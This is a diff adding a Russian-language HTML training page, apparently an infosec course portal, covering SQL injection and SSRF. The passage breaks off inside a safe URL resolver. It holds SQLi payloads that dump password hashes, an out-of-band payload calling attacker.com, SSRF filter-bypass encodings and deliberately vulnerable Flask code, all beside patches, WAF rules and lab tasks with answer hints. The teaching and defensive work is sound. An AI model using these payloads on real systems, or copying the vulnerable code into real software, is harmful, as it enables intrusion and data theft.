@@ -1,0 +1,2518 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CYBERSEC ACADEMY | Фундаментальный практический курс по ИБ: СПО → Вуз → SOC</title>
+  <meta name="description" content="Углубленный академический и практический портал по информационной безопасности: компиляция уязвимостей, физика сетевых протоколов, ядро Linux, протокол Kerberos, Secure Coding и Detection Engineering.">
+  
+  <!-- Fonts: Outfit (Headings), Inter (Body), JetBrains Mono (Code) -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:ital,wght@0,400;0,600;0,700;1,400&family=Outfit:wght@500;600;700;800;900&display=swap" rel="stylesheet">
+  
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+  <!-- =========================================================================
+       TOP NAVBAR
+       ========================================================================= -->
+  <header class="navbar">
+    <a href="#" class="nav-brand">
+      <div class="brand-icon">0x</div>
+      <div class="brand-title">
+        CYBERSEC<span>ACADEMY</span>
+        <span class="brand-subtitle">Applied & Academic InfoSec: Red · Blue · Detection</span>
+      </div>
+    </a>
+
+    <div class="nav-stats">
+      <div class="progress-pill">
+        <span style="color: var(--text-dim); font-size: 11px;">ПРОГРЕСС:</span>
+        <div class="progress-bar-mini">
+          <div class="progress-fill-mini" id="progress-fill-mini"></div>
+        </div>
+        <span id="progress-text-mini" style="font-family: var(--font-mono); font-weight: 600;">0/45 (0%)</span>
+      </div>
+      <div class="rank-badge" id="user-rank-badge">Студент СПО</div>
+    </div>
+
+    <div class="nav-actions">
+      <button class="btn btn-outline" id="open-lab-modal-btn">
+        <span style="color: var(--accent-cyan);">⚡</span> Стенд Docker
+      </button>
+      <a href="#terminal-sandbox" class="btn btn-primary">
+        <span>🔍 WAF Инспектор</span>
+      </a>
+    </div>
+  </header>
+
+  <!-- =========================================================================
+       MAIN LAYOUT
+       ========================================================================= -->
+  <div class="app-container">
+
+    <!-- SIDEBAR NAVIGATION -->
+    <aside class="sidebar">
+      <div class="sidebar-search">
+        <span class="sidebar-search-icon">🔍</span>
+        <input type="text" id="search-input" placeholder="Поиск атаки, RFC, CVE, MITRE...">
+      </div>
+
+      <nav class="sidebar-nav-group">
+        <div class="sidebar-nav-title">Модуль 1: Web & API Security</div>
+        <a href="#topic-sqli" class="sidebar-link">
+          <span>1.1 SQL Injection (AST & Protocols)</span>
+          <span class="sidebar-badge">T1190</span>
+        </a>
+        <a href="#topic-ssrf" class="sidebar-link">
+          <span>1.2 SSRF & Cloud IMDSv1/v2</span>
+          <span class="sidebar-badge">T1552</span>
+        </a>
+        <a href="#topic-race" class="sidebar-link">
+          <span>1.3 Race Conditions (ACID & HTTP/2)</span>
+          <span class="sidebar-badge">CWE-362</span>
+        </a>
+        <a href="#topic-jwt" class="sidebar-link">
+          <span>1.4 Broken Auth & JWT Key Confusion</span>
+          <span class="sidebar-badge">RFC 7519</span>
+        </a>
+
+        <div class="sidebar-nav-title" style="margin-top: 14px;">Модуль 2: Сети и протоколы (L2–L7)</div>
+        <a href="#topic-arp" class="sidebar-link">
+          <span>2.1 L2: ARP Spoofing & DAI</span>
+          <span class="sidebar-badge">RFC 826</span>
+        </a>
+        <a href="#topic-scan" class="sidebar-link">
+          <span>2.2 TCP State Machine & OS Fingerprint</span>
+          <span class="sidebar-badge">RFC 793</span>
+        </a>
+        <a href="#topic-dns" class="sidebar-link">
+          <span>2.3 DNS Kaminsky & Tunneling</span>
+          <span class="sidebar-badge">RFC 1035</span>
+        </a>
+
+        <div class="sidebar-nav-title" style="margin-top: 14px;">Модуль 3: Linux & Host Security</div>
+        <a href="#topic-caps" class="sidebar-link">
+          <span>3.1 Linux Capabilities & task_struct</span>
+          <span class="sidebar-badge">Kernel</span>
+        </a>
+        <a href="#topic-docker" class="sidebar-link">
+          <span>3.2 Docker Escape & Namespaces</span>
+          <span class="sidebar-badge">T1611</span>
+        </a>
+        <a href="#topic-suid" class="sidebar-link">
+          <span>3.3 SUID, glibc AT_SECURE & PATH</span>
+          <span class="sidebar-badge">T1548</span>
+        </a>
+
+        <div class="sidebar-nav-title" style="margin-top: 14px;">Модуль 4: Active Directory & Enterprise</div>
+        <a href="#topic-kerberos" class="sidebar-link">
+          <span>4.1 Kerberos RFC 4120 & Roasting</span>
+          <span class="sidebar-badge">T1558</span>
+        </a>
+        <a href="#topic-pth" class="sidebar-link">
+          <span>4.2 Pass-the-Hash & NTLM Relay</span>
+          <span class="sidebar-badge">T1550</span>
+        </a>
+        <a href="#topic-adcs" class="sidebar-link">
+          <span>4.3 AD CS & Сертификаты (ESC1)</span>
+          <span class="sidebar-badge">T1649</span>
+        </a>
+
+        <div class="sidebar-nav-title" style="margin-top: 14px;">Модуль 5: Detection Engineering</div>
+        <a href="#topic-sigma" class="sidebar-link">
+          <span>5.1 Sigma Rules & Pyramid of Pain</span>
+          <span class="sidebar-badge">SOC</span>
+        </a>
+        <a href="#topic-sysmon" class="sidebar-link">
+          <span>5.2 Windows Sysmon & Linux Auditd</span>
+          <span class="sidebar-badge">Events</span>
+        </a>
+        <a href="#topic-ir" class="sidebar-link">
+          <span>5.3 DFIR & Анализ оперативной памяти</span>
+          <span class="sidebar-badge">RFC 3227</span>
+        </a>
+      </nav>
+    </aside>
+
+    <!-- MAIN VIEW -->
+    <main class="main-content">
+
+      <!-- HERO BANNER -->
+      <section class="hero">
+        <div class="hero-tag">
+          <span class="pulse"></span>
+          АКАДЕМИЧЕСКИЙ ТРЕК: СПО → ВУЗОВСКИЙ УРОВЕНЬ → ENTERPRISE SOC
+        </div>
+        <h1>Инженерная и теоретическая кибербезопасность: Анатомия атак, Харденинг & Detection Engineering</h1>
+        <p>
+          Этот портал спроектирован для глубокого теоретического и практического освоения дисциплины «Информационная безопасность». 
+          Здесь подробно раскрыты спецификации стандартов RFC, поведение компиляторов и сетевых стеков операционных систем, математические основы криптографических атак, архитектура разграничения доступа в ядре Linux и домене Active Directory, а также построение правил обнаружения для высоконагруженных SOC.
+        </p>
+
+        <div class="hero-stats">
+          <div class="stat-card">
+            <div class="stat-value">5 <span>МОДУЛЕЙ</span></div>
+            <div class="stat-label">Web, Сети, Ядро Linux, AD, DFIR</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-value">15 <span>ТЕМ</span></div>
+            <div class="stat-label">Фундаментальные стандарты RFC</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-value" id="stat-completed-count">0 <span>/ 45</span></div>
+            <div class="stat-label">Лабораторных задач с подсказками</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-value" id="stat-percent-display">0%</div>
+            <div class="stat-label">Ваш текущий прогресс</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- CONTROL BAR: ROLE FILTER -->
+      <div class="control-bar">
+        <div class="filter-pills">
+          <span style="font-size: 12px; color: var(--text-dim); margin-right: 6px; font-weight: 600;">ФИЛЬТР МАТЕРИАЛОВ:</span>
+          <button class="filter-pill active" data-filter="all">Все материалы</button>
+          <button class="filter-pill pill-red" data-filter="red">🔴 Red Team (Атака & Рекон)</button>
+          <button class="filter-pill pill-blue" data-filter="blue">🔵 Blue Team (Патчинг & Hardening)</button>
+          <button class="filter-pill pill-detection" data-filter="detection">🟣 Detection (SIEM & IDS)</button>
+        </div>
+        <div>
+          <button class="btn btn-emerald" id="btn-quick-docker" onclick="document.getElementById('lab-modal').classList.add('open')">
+            <span>📦 Скачать Docker-Стенд</span>
+          </button>
+        </div>
+      </div>
+
+      <!-- INTERACTIVE WAF & PAYLOAD INSPECTOR -->
+      <section id="terminal-sandbox" class="topic-card" style="margin-bottom: 40px;" data-roles="red blue detection">
+        <div class="topic-header">
+          <div class="topic-title-group">
+            <h3><span>⚡</span> Интерактивный WAF & Security Inspector</h3>
+            <div class="topic-meta">
+              <span class="badge badge-level-easy">Инструмент самопроверки</span>
+              <span class="badge badge-mitre">Rule Testing</span>
+            </div>
+          </div>
+        </div>
+        <div class="topic-body">
+          <p style="color: var(--text-muted); font-size: 14px;">
+            Проверьте любой сетевой пейлоад (SQLi, SSRF к Cloud Metadata, Command Injection) в режиме реального времени. Эмулятор продемонстрирует реакцию ModSecurity WAF, сработку сигнатуры Suricata NIDS и укажет фундаментальное архитектурное исправление на уровне кода.
+          </p>
+          <div style="display: flex; gap: 10px; margin-top: 6px;">
+            <input type="text" id="terminal-input" placeholder="Например: ' UNION SELECT null, password_hash FROM users-- или http://169.254.169.254" 
+                   style="flex: 1; background: var(--bg-tertiary); border: 1px solid var(--border-subtle); border-radius: var(--radius-md); padding: 10px 14px; color: #fff; font-family: var(--font-mono); font-size: 13px; outline: none;">
+            <button class="btn btn-primary" id="terminal-verify-btn">Проверить пакет</button>
+          </div>
+          <div id="terminal-output" style="background: #090d16; border: 1px solid var(--border-subtle); border-radius: var(--radius-md); padding: 14px 18px; font-family: var(--font-mono); font-size: 12.5px; line-height: 1.6; min-height: 70px; color: var(--text-dim);">
+            [STANDBY] Введите строку запроса или пейлоад выше и нажмите «Проверить пакет».
+          </div>
+        </div>
+      </section>
+
+      <!-- =====================================================================
+           МОДУЛЬ 1: WEB & API SECURITY
+           ===================================================================== -->
+      <section class="module-section">
+        <div class="module-header">
+          <div class="module-title-wrap">
+            <div class="module-num">01</div>
+            <div>
+              <h2 class="module-title">Веб-безопасность и API (Web Application Security)</h2>
+              <div class="module-desc">От синтаксического анализа AST в СУБД к протокольным уязвимостям IMDSv1/v2, конкурентности и алгоритмической путанице токенов</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- 1.1 SQL Injection -->
+        <article class="topic-card" id="topic-sqli" data-roles="red blue detection">
+          <div class="topic-header">
+            <div class="topic-title-group">
+              <h3>1.1 SQL Injection: Абстрактное синтаксическое дерево (AST) и 5 классов инъекций</h3>
+              <div class="topic-meta">
+                <span class="badge badge-mitre">MITRE T1190</span>
+                <span class="badge badge-cve">CWE-89</span>
+                <span class="badge badge-level-easy">ФУНДАМЕНТАЛЬНАЯ ТЕОРИЯ</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic-body">
+            <div class="theory-block">
+              <div class="theory-text">
+                <div class="theory-subheading">Архитектура обработки SQL-запроса в ядре СУБД</div>
+                <p>
+                  В основе любой реляционной СУБД (PostgreSQL, MySQL, SQLite, Oracle) лежит многостадийный транслятор запросов:
+                </p>
+                <div class="protocol-steps">
+                  <div class="protocol-step">
+                    <div class="step-num">1</div>
+                    <div><strong>Лексический анализ (Lexer / Tokenizer):</strong> Преобразует исходную строку SQL в поток токенов (ключевые слова <code>SELECT</code>, идентификаторы полей, строковые литералы, операторы).</div>
+                  </div>
+                  <div class="protocol-step">
+                    <div class="step-num">2</div>
+                    <div><strong>Синтаксический анализ (Parser):</strong> Строит <em>Абстрактное Синтаксическое Дерево</em> (<strong>AST — Abstract Syntax Tree</strong>), проверяя соответствие грамматике SQL (BNF).</div>
+                  </div>
+                  <div class="protocol-step">
+                    <div class="step-num">3</div>
+                    <div><strong>Оптимизатор запросов (Query Optimizer):</strong> Формирует план выполнения (Execution Plan), выбирая индексы (B-Tree, Hash), типы соединений таблиц (Nested Loop, Hash Join) и предикаты.</div>
+                  </div>
+                  <div class="protocol-step">
+                    <div class="step-num">4</div>
+                    <div><strong>Движок исполнения (Execution Engine):</strong> Считывает страницы данных с диска или из Buffer Pool и возвращает результат.</div>
+                  </div>
+                </div>
+
+                <p>
+                  <strong>Фундаментальная причина уязвимости (Root Cause):</strong> При использовании конкатенации строк (например, <code>f"WHERE title = '{user_input}'"</code>) пользовательские данные попадают в фазу <em>Лексического и Синтаксического анализа</em>. Если ввод содержит метасимвол кавычки (<code>'</code>), лексер завершает токен строкового литерала, а последующие слова (<code>OR</code>, <code>UNION</code>, <code>SELECT</code>) распознаются как <strong>новые операторные узлы в AST</strong>. Это изменяет структуру самого алгоритма исполнения!
+                </p>
+
+                <div class="theory-subheading">Сравнительная классификация классов SQL Injection</div>
+                <div class="table-responsive">
+                  <table class="theory-table">
+                    <thead>
+                      <tr>
+                        <th>Класс инъекции</th>
+                        <th>Механизм извлечения</th>
+                        <th>Канал связи</th>
+                        <th>Скорость / Сложность</th>
+                        <th>Пример конструкции</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><strong>In-Band: Union-Based</strong></td>
+                        <td>Оператор <code>UNION [ALL] SELECT</code> объединяет набор строк целевой выборки с вредоносной.</td>
+                        <td>Прямой HTTP Response</td>
+                        <td>Высокая (десятки КБ/с). Требует совпадения типов и числа колонок.</td>
+                        <td><code>' UNION SELECT null, username, password_hash FROM users--</code></td>
+                      </tr>
+                      <tr>
+                        <td><strong>In-Band: Error-Based</strong></td>
+                        <td>Принудительный вызов ошибки преобразования типов или переполнения, выводящей секретные данные в текст ошибки.</td>
+                        <td>HTTP Response (Error Text)</td>
+                        <td>Средняя (ограничена длиной буфера ошибки, ~50-200 байт/запрос).</td>
+                        <td><code>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))--</code></td>
+                      </tr>
+                      <tr>
+                        <td><strong>Blind: Boolean-Based</strong></td>
+                        <td>Внедрение булева предиката. Сервер возвращает разный контент при <code>TRUE</code> и <code>FALSE</code>.</td>
+                        <td>Косвенный (разница в длине ответа / HTTP статусе)</td>
+                        <td>Низкая. Извлечение по 1 биту данных за HTTP-запрос.</td>
+                        <td><code>' AND (SELECT ASCII(SUBSTR(password,1,1)) FROM users WHERE id=1) > 80--</code></td>
+                      </tr>
+                      <tr>
+                        <td><strong>Blind: Time-Based</strong></td>
+                        <td>Использование блокирующих функций задержки ядра СУБД при истинности проверяемого условия.</td>
+                        <td>Задержка тайминга сокета TCP (RTT)</td>
+                        <td>Очень низкая (1 символ за 5-10 секунд). Чувствительна к джиттеру сети.</td>
+                        <td><code>' AND IF(version() LIKE '8%', SLEEP(5), 0)--</code></td>
+                      </tr>
+                      <tr>
+                        <td><strong>Out-of-Band (OOB)</strong></td>
+                        <td>Принуждение СУБД к генерации сетевого DNS или SMB запроса к серверу атакующего.</td>
+                        <td>Внешний протокол (DNS/SMB)</td>
+                        <td>Высокая при наличии доступа СУБД во внешнюю сеть.</td>
+                        <td><code>'; EXEC master..xp_dirtree '\\attacker.com\share'--</code></td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+
+                <div class="theory-subheading">Математика бинарного поиска в Blind SQL Injection</div>
+                <p>
+                  При слепом посимвольном извлечении данных (Boolean-based) перебор каждого символа ASCII таблицы (128 значений) последовательно потребовал бы в среднем 64 HTTP-запроса на символ. Использование алгоритма <strong>бинарного поиска (метод деления отрезка пополам)</strong> сокращает число запросов до логарифмической сложности:
+                </p>
+                <div class="math-block">
+                  Количество запросов на символ = ⌈log₂(128)⌉ = 7 запросов.<br>
+                  Для строки пароля длиной 32 байта: 32 × 7 = 224 HTTP-запроса вместо 4096!
+                </div>
+
+                <div class="theory-subheading">Протокольный механизм Prepared Statements</div>
+                <p>
+                  Настоящие параметризованные запросы (Prepared Statements) работают через специальный бинарный протокол СУБД (например, в MySQL команды <code>COM_STMT_PREPARE</code> и <code>COM_STMT_EXECUTE</code>):
+                </p>
+                <ul style="padding-left: 20px; margin-bottom: 8px;">
+                  <li>Клиент отправляет шаблон: <code>SELECT * FROM users WHERE login = ? AND pass = ?</code>. СУБД <strong>однократно компилирует AST и генерирует план запроса</strong>. Места под параметры помечаются дескрипторами типов.</li>
+                  <li>Клиент отправляет значения параметров по бинарному протоколу. Они вставляются непосредственно в ячейки памяти уже скомпилированного плана. Никакая часть входных данных <strong>в принципе не может быть интерпретирована как SQL-код</strong>, даже если содержит кавычки, точки с запятой или комментарии.</li>
+                </ul>
+              </div>
+
+              <div class="flow-diagram">
+======================== АРХИТЕКТУРА ИСКАЖЕНИЯ СИНТАКСИЧЕСКОГО ДЕРЕВА (AST) ========================
+
+[1. Легитимный AST (Prepared Statement)]:               [2. Скомпрометированный AST (Конкатенация)]:
+                 SelectStmt                                                    SelectStmt
+                 /        \                                                   /        \
+             Fields      WhereClause                                      Fields      WhereClause
+             (title)          |                                           (title)          |
+                           BinaryOp (=)                                                BinaryOp (OR)
+                          /            \                                              /             \
+                   Column(title)   Literal('Book')                             BinaryOp (=)     Literal('1'='1')
+                                                                               /          \     [ВСЕГДА TRUE!]
+                                                                         Column(title)  Literal('')
+              </div>
+            </div>
+
+            <!-- Code Viewer -->
+            <div class="code-viewer">
+              <div class="code-tabs">
+                <div class="tab-buttons">
+                  <button class="code-tab-btn tab-vuln active" data-tab="vuln">🔴 Уязвимый код (Python)</button>
+                  <button class="code-tab-btn tab-patch" data-tab="patch">🔵 Безопасный патч (Prepared)</button>
+                  <button class="code-tab-btn tab-def" data-tab="defense">🟣 Детект & WAF (ModSecurity)</button>
+                </div>
+                <button class="copy-btn"><span>📋 Копировать</span></button>
+              </div>
+
+              <pre class="code-panel active" data-panel="vuln"><code># VULNERABLE: конкатенация строк в SQL ломает AST на этапе парсинга
+@app.route('/api/v1/search', methods=['GET'])
+def search_products():
+    query = request.args.get('q', '')
+    conn = sqlite3.connect("store.db")
+    cursor = conn.cursor()
+
+    # Ошибка: строка компилируется с вредоносным AST-узлом
+    sql = f"SELECT id, title, price FROM products WHERE is_hidden = 0 AND title LIKE '%{query}%'"
+    cursor.execute(sql)
+    return jsonify(cursor.fetchall())</code></pre>
+
+              <pre class="code-panel" data-panel="patch"><code># SECURE: Параметризованный запрос (Prepared Statement)
+@app.route('/api/v1/search', methods=['GET'])
+def search_products_secure():
+    query = request.args.get('q', '')
+    conn = sqlite3.connect("store.db")
+    cursor = conn.cursor()
+
+    # Разделение кода и данных:
+    # Параметр передается через кортеж параметров протокола СУБД
+    sql = "SELECT id, title, price FROM products WHERE is_hidden = 0 AND title LIKE ?"
+    cursor.execute(sql, (f"%{query}%",))
+    return jsonify(cursor.fetchall())</code></pre>
+
+              <pre class="code-panel" data-panel="defense"><code># Правило ModSecurity WAF Core Rule Set (942100): Выявление операторов SQL Injection
+SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* "@rx (?i:(?:\b(?:union\s+(?:all\s+)?select|select\s+.*\s+from)\b))" \
+    "id:942100,\
+    phase:2,\
+    block,\
+    capture,\
+    t:none,t:urlDecodeUni,t:lowercase,\
+    msg:'SQL Injection Attack: Common DB Operators Detected',\
+    logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}',\
+    tag:'application-multi',\
+    tag:'language-multi',\
+    tag:'platform-multi',\
+    tag:'attack-sqli',\
+    setvar:'tx.anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+
+# Сигнатура Suricata NIDS (Проверка аномалий в строке HTTP URI)
+alert http any any -> $HOME_NET any (msg:"EXPLOIT-SQLi In-Band UNION SELECT attempt"; content:"UNION"; nocase; http_uri; content:"SELECT"; nocase; http_uri; classtype:web-application-attack; sid:3000002; rev:2;)</code></pre>
+            </div>
+
+            <!-- Практические задачи -->
+            <div class="tasks-container">
+              <div class="tasks-header">
+                <h4><span>🧪</span> Лабораторные задания по теме</h4>
+                <span style="font-size: 12px; color: var(--text-dim);">4 задачи с верификацией</span>
+              </div>
+
+              <div class="task-card">
+                <div class="task-top">
+                  <label class="task-label">
+                    <input type="checkbox" class="task-checkbox" data-task-id="sqli-1">
+                    <div class="task-text">
+                      <div class="task-title">Задание 1.1: Определение структуры столбцов (In-Band Recon)</div>
+                      <div class="task-desc">Определить точное количество возвращаемых колонок в эндпоинте <code>/api/v1/search</code> и типы данных.</div>
+                    </div>
+                  </label>
+                </div>
+                <div class="task-details">
+                  Выполните перебор через <code>' ORDER BY 1--</code>, <code>' ORDER BY 2--</code> или используйте <code>' UNION SELECT NULL, NULL, NULL, NULL--</code>.
+                  <button class="hint-toggle"><span>💡 Показать решение / подсказку</span></button>
+                  <div class="hint-content">
+                    Запрос: <code>GET /api/v1/search?q=' UNION SELECT 1, 'test', 'desc', 99--</code>
+                    Если ответ возвращает массив с 4 колонками без ошибки 500 — число полей равно 4.
+                  </div>
+                </div>
+              </div>
+
+              <div class="task-card">
+                <div class="task-top">
+                  <label class="task-label">
+                    <input type="checkbox" class="task-checkbox" data-task-id="sqli-2">
+                    <div class="task-text">
+                      <div class="task-title">Задание 1.2: Извлечение скрытых данных пользователей</div>
+                      <div class="task-desc">Сформировать запрос для извлечения хэшей паролей пользователей из системной таблицы <code>users</code>.</div>
+                    </div>
+                  </label>
+                </div>
+                <div class="task-details">
+                  Объедините выборку из таблицы <code>products</code> с полями <code>id, username, password_hash, balance</code> таблицы <code>users</code>.
+                  <button class="hint-toggle"><span>💡 Показать решение / подсказку</span></button>
+                  <div class="hint-content">
+                    Пейлоад: <code>' UNION SELECT id, username, password_hash, balance FROM users--</code>
+                  </div>
+                </div>
+              </div>
+
+              <div class="task-card">
+                <div class="task-top">
+                  <label class="task-label">
+                    <input type="checkbox" class="task-checkbox" data-task-id="sqli-3">
+                    <div class="task-text">
+                      <div class="task-title">Задание 1.3: Исправление кода (Refactoring to Prepared Statements)</div>
+                      <div class="task-desc">Модифицировать файл <code>app/app.py</code>, устранив конкатенацию строк и протестировать поведение.</div>
+                    </div>
+                  </label>
+                </div>
+                <div class="task-details">
+                  Замените динамический f-string на вызов <code>cursor.execute(sql, (params,))</code>.
+                  <button class="hint-toggle"><span>💡 Показать решение / подсказку</span></button>
+                  <div class="hint-content">
+                    <code>cursor.execute("SELECT id, title, description, price FROM products WHERE is_hidden = 0 AND title LIKE ?", (f"%{query}%",))</code>
+                  </div>
+                </div>
+              </div>
+
+              <div class="task-card">
+                <div class="task-top">
+                  <label class="task-label">
+                    <input type="checkbox" class="task-checkbox" data-task-id="sqli-4">
+                    <div class="task-text">
+                      <div class="task-title">Задание 1.4: Инженерия детекта в SIEM (Sigma Rule)</div>
+                      <div class="task-desc">Написать правило Sigma для веб-сервера NGINX, детектирующее попытки обхода через inline-комментарии SQL.</div>
+                    </div>
+                  </label>
+                </div>
+                <div class="task-details">
+                  Создайте правило, отслеживающее URI с паттернами <code>/**/</code> в комбинации с ключевыми словами <code>SELECT</code>, <code>UNION</code>.
+                  <button class="hint-toggle"><span>💡 Показать решение / подсказку</span></button>
+                  <div class="hint-content">
+                    <code>detection:
+  selection:
+    c-uri|contains|all:
+      - '/**/'
+    c-uri|contains:
+      - 'union'
+      - 'select'
+  condition: selection</code>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </article>
+
+        <!-- 1.2 SSRF & Cloud Metadata -->
+        <article class="topic-card" id="topic-ssrf" data-roles="red blue detection">
+          <div class="topic-header">
+            <div class="topic-title-group">
+              <h3>1.2 SSRF: Стандарт Link-Local (RFC 3927), IMDSv1/v2 и механика DNS Rebinding</h3>
+              <div class="topic-meta">
+                <span class="badge badge-mitre">MITRE T1552.005</span>
+                <span class="badge badge-cve">CWE-918</span>
+                <span class="badge badge-level-mid">CLOUD & ENTERPRISE</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic-body">
+            <div class="theory-block">
+              <div class="theory-text">
+                <div class="theory-subheading">Архитектура Link-Local адресации и Cloud Metadata</div>
+                <p>
+                  По спецификации <span class="rfc-badge">RFC 3927</span> блок адресов <code>169.254.0.0/16</code> зарезервирован для автоконфигурации сетевых интерфейсов в локальном сегменте (Link-Local / IPv4LL). Пакеты с такими адресами <strong>не подлежат маршрутизации через шлюзы</strong>.
+                </p>
+                <p>
+                  Все ключевые облачные провайдеры (Amazon Web Services, Google Cloud Platform, Microsoft Azure, OpenStack, DigitalOcean) используют виртуальный сетевой стек гипервизора (KVM, Nitro, Hyper-V) для перехвата обращений к адресу <code>http://169.254.169.254/</code>. Этот сервис называется <strong>Instance Metadata Service (IMDS)</strong>.
+                </p>
+
+                <div class="theory-subheading">Сравнительный анализ IMDSv1 и IMDSv2</div>
+                <div class="table-responsive">
+                  <table class="theory-table">
+                    <thead>
+                      <tr>
+                        <th>Критерий</th>
+                        <th>IMDSv1 (Уязвимый стандарт)</th>
+                        <th>IMDSv2 (AWS Session-Oriented Hardening)</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><strong>Метод запроса</strong></td>
+                        <td>Простой <code>GET</code> запрос к эндпоинту.</td>
+                        <td>Обязательный двухэтапный протокол с методом <code>PUT</code>.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Аутентификация</strong></td>
+                        <td>Отсутствует. Доступ открыт любому процессу на хосте.</td>
+                        <td>Требует сессионный токен в заголовке <code>X-aws-ec2-metadata-token</code>.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Уязвимость к SSRF</strong></td>
+                        <td><strong>Критическая.</strong> Любой базовый SSRF в веб-приложении мгновенно извлекает секреты IAM-роли.</td>
+                        <td><strong>Защищен.</strong> Большинство SSRF эксплойтов не могут отправлять произвольные методы (PUT) и кастомные HTTP-заголовки.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Сетевой TTL пакета</strong></td>
+                        <td>Не регламентирован.</td>
+                        <td>По умолчанию <code>IP_TTL = 1</code> на ответных пакетах токена, что блокирует прохождение через промежуточные reverse-proxy и контейнерные шлюзы.</td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+
+                <div class="theory-subheading">Анатомия атаки DNS Rebinding (Обход белых списков и фильтров IP)</div>
+                <p>
+                  Многие разработчики внедряют наивную защиту: резолвят полученный домен в IP, и если IP не является приватным, выполняют HTTP-запрос. Механика <strong>DNS Rebinding</strong> эксплуатирует разницу во времени между проверкой и использованием (Time-of-Check to Time-of-Use — TOCTOU):
+                </p>
+                <div class="protocol-steps">
+                  <div class="protocol-step">
+                    <div class="step-num">1</div>
+                    <div>Атакующий регистрирует домен (например, <code>rebind.attacker.com</code>) и поднимает собственный авторитетный DNS-сервер.</div>
+                  </div>
+                  <div class="protocol-step">
+                    <div class="step-num">2</div>
+                    <div>На первый запрос резолвера (проверка в коде приложения) DNS-сервер возвращает легитимный публичный IP: <code>198.51.100.1</code> с <strong>TTL = 0 секунд</strong> (запрет кэширования).</div>
+                  </div>
+                  <div class="protocol-step">
+                    <div class="step-num">3</div>
+                    <div>Приложение считает адрес безопасным и вызывает <code>requests.get()</code>. Так как TTL истек, библиотека выполняет повторный DNS-запрос.</div>
+                  </div>
+                  <div class="protocol-step">
+                    <div class="step-num">4</div>
+                    <div>DNS-сервер атакующего на второй запрос возвращает приватный адрес: <code>169.254.169.254</code> или <code>127.0.0.1</code>. Запрос отправляется на закрытый внутренний сервис!</div>
+                  </div>
+                </div>
+
+                <div class="theory-subheading">Альтернативные представления IP-адресов в стеке сокетов</div>
+                <div class="table-responsive">
+                  <table class="theory-table">
+                    <thead>
+                      <tr>
+                        <th>Формат представления</th>
+                        <th>Строка URL / Хоста</th>
+                        <th>Эквивалентный IP</th>
+                        <th>Принцип интерпретации libc <code>inet_aton()</code></th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><strong>Dotted Decimal</strong></td>
+                        <td><code>127.0.0.1</code></td>
+                        <td>127.0.0.1</td>
+                        <td>Стандартный октетный формат.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Dotted Hexadecimal</strong></td>
+                        <td><code>0x7f.0x0.0x0.0x1</code></td>
+                        <td>127.0.0.1</td>
+                        <td>Каждый октет парсится с префиксом 0x как hex-байт.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Dotted Octal</strong></td>
+                        <td><code>0177.0.0.01</code></td>
+                        <td>127.0.0.1</td>
+                        <td>Ведущий ноль воспринимается парсером как восьмеричная система счисления.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Integer (DWORD)</strong></td>
+                        <td><code>2130706433</code></td>
+                        <td>127.0.0.1</td>
+                        <td>32-битное беззнаковое целое: (127×2²⁴) + (0×2¹⁶) + (0×2⁸) + 1.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>IPv6-Mapped IPv4</strong></td>
+                        <td><code>http://[::ffff:127.0.0.1]/</code></td>
+                        <td>127.0.0.1</td>
+                        <td>Специальный префикс IPv6 (RFC 4291), прозрачно транслируемый ядром в IPv4.</td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+              </div>
+            </div>
+
+            <!-- Code Viewer -->
+            <div class="code-viewer">
+              <div class="code-tabs">
+                <div class="tab-buttons">
+                  <button class="code-tab-btn tab-vuln active" data-tab="vuln">🔴 Уязвимый код (Python)</button>
+                  <button class="code-tab-btn tab-patch" data-tab="patch">🔵 Безопасный Resolver (Защита)</button>
+                  <button class="code-tab-btn tab-def" data-tab="defense">🟣 Сетевая изоляция & IMDSv2</button>
+                </div>
+                <button class="copy-btn"><span>📋 Копировать</span></button>
+              </div>
+
+              <pre class="code-panel active" data-panel="vuln"><code># VULNERABLE: прямое выполнение HTTP-запроса по переданному URL
+@app.route('/api/v1/fetch', methods=['POST'])
+def fetch_url():
+    target_url = request.json.get('url')
+    # Сервер слепо обращается к любому переданному хосту и порту
+    resp = requests.get(target_url, timeout=3)
+    return jsonify({"data": resp.text})</code></pre>
+
+              <pre class="code-panel" data-panel="patch"><code># SECURE: Комплексный валидатор: валидация схемы, фиксация IP и защита от DNS Rebinding
+import socket
+import ipaddress
+from urllib.parse import urlparse
+
+def safe_http_fetch(url):
+    parsed = urlparse(url)
+    if parsed.scheme not in ('http', 'https'):
+        raise ValueError("Разрешены только протоколы HTTP и HTTPS")
+        
+    hostname = parsed.hostname
+    port = parsed.port or (80 if parsed.scheme == 'http' else 443)
+    
+    # 1. Резолвим IP адрес хоста
